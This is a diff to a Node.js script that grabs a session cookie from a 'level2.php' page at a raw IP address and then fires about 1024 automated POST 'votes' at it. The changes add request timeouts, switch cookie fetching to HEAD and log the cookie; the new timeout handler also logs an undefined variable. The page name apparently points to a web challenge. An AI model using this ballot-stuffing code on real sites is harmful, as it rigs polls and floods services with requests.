@@ -29,6 +29,7 @@ let options = {
     headers: {
         'User-Agent': 'Windows NT 5.1 Node.js Post Requests - Alexandro de Oliveira', //'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
         'Referer': 'http://173.246.108.142/level2.php',
+        'Connection': 'close',
         'Content-Type': 'application/x-www-form-urlencoded',
         'Content-Length': params.length
     }
@@ -39,7 +40,7 @@ let cookies = fetchCookie(options);
 // This is the main function, which will process all POST requests.
 function runIt(options, params){
     let votes = 0; // Initializing a counter.
-    for( let i = 0; i < num_votes; i++) { // 1024 times.
+    for(let i = 0; i < num_votes; i++) { // 1024 times.
         let post = http.request(options, (res) => {
             // Optionally we could print the status code.
             //console.log('Status: ' + res.statusCode);
@@ -55,6 +56,13 @@ function runIt(options, params){
                 console.log(e);
             });
         });
+        post.on('socket', function (socket) {
+            socket.setTimeout(20000);
+            socket.on('timeout', function() {
+                console.log(msg)
+                post.abort();
+            });
+        });
         post.on('error', (e) => {
             console.log(`Request problem: ${e.message}`);
         });
@@ -68,13 +76,14 @@ function runIt(options, params){
 // This function is used just to get a valid cookie or use an old, specified in case of failure.
 // After that we cann the main function.
 function fetchCookie(options) {
-    options['method'] = "GET";
+    options['method'] = "HEAD";
     let req = http.request(options, (res) => {
         // Optionally show the headers:
         console.log(JSON.stringify(res.headers));
-        let parsing = res.headers['set-cookie'][0] || "dbff031ccdef4d0be53054fba99dc18e06d0030e";
+        let parsing = res.headers['set-cookie'][0] || "dbff031ccdef4d0be53054fba99dc18e06d0030e"; // failsafe.
         // Parsing the cookie:
         let cookie = parsing.split(';')[0].split('=')[1];
+        console.log(cookie);
         data['key'] = cookie;
         postParams = querystring.stringify(data);
         options['method'] = "POST";
